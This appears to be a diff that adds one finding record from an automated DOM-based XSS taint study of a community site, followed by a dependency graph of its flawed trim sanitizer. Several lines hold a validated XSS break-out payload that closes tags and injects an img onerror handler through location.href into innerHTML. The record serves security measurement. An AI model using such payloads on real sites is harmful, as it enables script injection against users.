@@ -1,0 +1,78 @@
+// Finding: 87e335dc-ed12-45c7-b650-3c6a41b88812
+// Finding.url: https://community.example65.com/de-de/start##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('790528715a7c459698ec5766fab8d122')><!--/*
+// Finding.parentloc: https://community.example65.com/de-de/start##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('790528715a7c459698ec5766fab8d122')><!--/*
+// Finding.domain: community.example65.com
+// Finding.base_domain: example65.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: trim
+// Sanitizer.location: https://community.example65.com/frontend/brandings/tchibo_2016_08/view/ressources/patternlib/4696971ebabc7df2.js - trim:2:3111
+// Finding.begin: 0
+// Finding.end: 121
+// Finding.original_uuid: 20a8e960-653c-4d3c-90a9-b6e4115128fd
+// Finding.TwentyFiveMillionFlowsId: 740945078
+// Finding.script: https://community.example65.com/frontend/brandings/tchibo_2016_08/view/ressources/patternlib/4696971ebabc7df2.js
+// Finding.line: 3
+// Exploit.uuid: 79052871-5a7c-4596-98ec-5766fab8d122
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: filter
+// Exploit.quote_type: "
+// Exploit.tag: path
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 39
+// Exploit.replace_begin_url: 39
+// Exploit.replace_end_url: 39
+// Exploit.replace_begin_param: 11392
+// Exploit.replace_end_param: 11392
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -1773684504
+// DepGraph.sanitizer_hash: -1958185742
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="."];
+n2 [shape=box, label="Lit: .content_data_tchibo_inlinemenu a[href='"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: ']"];
+n5 [shape=ellipse, label="preg_replace"];
+n6 [shape=box, label="RegExp: /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/"];
+n7 [shape=box, label="Lit: "];
+n8 [shape=box, label="Var: x"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=doubleoctagon, label="Return: x"];
+n1 -> n2;
+n1 -> n0;
+n3 -> n1;
+n3 -> n4;
+n8 -> n3;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n9 -> n5;
+n10 -> n9;
+}
